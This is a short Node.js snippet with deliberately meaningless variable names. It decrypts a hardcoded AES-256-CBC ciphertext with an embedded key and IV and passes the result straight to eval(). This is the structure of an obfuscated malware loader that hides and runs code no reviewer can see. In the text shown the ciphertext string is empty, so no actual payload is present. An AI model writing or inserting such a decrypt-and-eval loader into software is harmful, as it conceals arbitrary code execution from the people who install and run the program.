const ito = require('crypto');
const itinho = Buffer.from('25fbe761bedfb08e45c2587ca4b4351b0e945f05c0d5b76d3f2f83a240f6cc9c', 'hex');
const octua = Buffer.from('d5c01ca982c5e4c3e62f01cab6ff6e83', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
